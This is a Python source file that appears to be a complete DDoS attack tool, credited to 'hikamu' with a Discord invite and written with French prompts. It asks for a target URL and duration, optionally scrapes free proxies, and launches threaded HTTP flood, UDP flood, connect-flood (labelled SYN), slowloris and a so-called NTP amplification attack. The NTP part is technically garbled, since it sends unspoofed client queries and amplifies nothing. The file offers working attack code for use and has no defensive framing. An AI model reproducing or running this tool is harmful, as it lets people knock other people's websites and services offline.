import socket
import threading
import time
import random
import sys
import os
import requests
from urllib.parse import urlparse
from itertools import cycle

def ascii_logo():
    print("""
    ████████╗███████╗██████╗ ███╗   ███╗
    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
       ██║   █████╗  ██████╔╝██╔████╔██║
       ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║
       ██║   ███████╗██║  ██║██║ ╚═╝ ██║
       ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
    ╔══════════════════════════════════╗
    ║  ddos tool by hikamu.                ║
    ║  ( https://discord.gg/Dns9Kumyf )    ║
    ╚══════════════════════════════════╝
    """)

def validate_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme in ['http', 'https'], result.netloc])
    except:
        return False

def fetch_proxies():
    print("[*] Récupération de proxies sur proxiescrape.com...")
    try:
        response = requests.get(
            "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&proxy_format=ipport&format=text",
            timeout=15
        )
        proxies = [p.strip() for p in response.text.splitlines() if ':' in p]
        print(f"[+] {len(proxies)} proxies récupérés")
        return proxies[:1000]
    except Exception as e:
        print(f"[!] Échec de récupération: {str(e)}")
        sys.exit(1)

def http_flood(target, proxies, duration):
    end_time = time.time() + duration
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (Linux; Android 10)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)'
        ]),
        'Accept': '*/*',
        'Connection': 'keep-alive'
    }

    proxy_cycle = cycle(proxies)

    while time.time() < end_time:
        try:
            proxy = next(proxy_cycle)
            requests.get(
                target,
                proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'},
                headers=headers,
                timeout=2,
                stream=True
            )
            sys.stdout.write("\r[HTTP] Requête envoyée via " + proxy)
            sys.stdout.flush()
        except:
            pass

def udp_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    payload = random._urandom(1024)

    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload, (target_ip, target_port))
            sock.close()
            sys.stdout.write("\r[UDP] Paquet envoyé à " + target_ip + ":" + str(target_port))
            sys.stdout.flush()
        except:
            pass

def syn_flood(target_ip, target_port, duration):
    end_time = time.time() + duration

    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((target_ip, target_port))
            sock.close()
            sys.stdout.write("\r[SYN] Paquet SYN envoyé à " + target_ip + ":" + str(target_port))
            sys.stdout.flush()
        except:
            pass

def slowloris(target, duration):
    end_time = time.time() + duration
    headers = [
        "User-Agent: Mozilla/5.0",
        "Accept-language: en-US,en,q=0.5",
        "Keep-alive: 300",
        "Connection: keep-alive"
    ]

    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((urlparse(target).hostname, 80 if urlparse(target).scheme == "http" else 443))
            sock.send(f"GET / HTTP/1.1\r\nHost: {urlparse(target).hostname}\r\n".encode())

            for header in headers:
                sock.send(f"{header}\r\n".encode())
                time.sleep(0.1)

            sock.send("\r\n".encode())
            sys.stdout.write("\r[SLOWLORIS] Connexion maintenue avec " + target)
            sys.stdout.flush()
        except:
            pass

def ntp_amplification(target_ip, duration):
    end_time = time.time() + duration
    ntp_servers = [
        "0.pool.ntp.org",
        "1.pool.ntp.org",
        "2.pool.ntp.org",
        "3.pool.ntp.org"
    ]

    while time.time() < end_time:
        try:
            for server in ntp_servers:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b'\x1b' + b'\0' * 47, (server, 123))
                sock.sendto(b'\x1b' + b'\0' * 47, (target_ip, 123))
                sock.close()
                sys.stdout.write("\r[NTP] Amplification vers " + target_ip)
                sys.stdout.flush()
        except:
            pass

def main():
    ascii_logo()

    target = input("\n[?] URL cible (ex: http://example.com): ").strip()
    if not validate_url(target):
        print("[!] URL invalide!")
        sys.exit(1)

    duration = int(input("[?] Durée de l'attaque (secondes): "))
    use_proxies = input("[?] Utiliser des proxies? (y/n): ").lower() == 'y'

    proxies = []
    if use_proxies:
        proxies = fetch_proxies()

    target_ip = socket.gethostbyname(urlparse(target).hostname)
    target_port = 80 if urlparse(target).scheme == "http" else 443

    print(f"\n[!] Lancement de l'attaque sur {target} ({target_ip}:{target_port})")
    print(f"[!] Durée: {duration} secondes | Proxies: {len(proxies) if use_proxies else 'Non'}")
  
    threads = []

    if use_proxies:
        t1 = threading.Thread(target=http_flood, args=(target, proxies, duration))
        t1.start()
        threads.append(t1)

    t2 = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
    t2.start()
    threads.append(t2)

    t3 = threading.Thread(target=syn_flood, args=(target_ip, target_port, duration))
    t3.start()
    threads.append(t3)

    t4 = threading.Thread(target=slowloris, args=(target, duration))
    t4.start()
    threads.append(t4)
  
    t5 = threading.Thread(target=ntp_amplification, args=(target_ip, duration))
    t5.start()
    threads.append(t5)
  
    for t in threads:
        t.join()

    print("\n[+] Attaque terminée!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interruption par l'utilisateur")
        sys.exit(0)
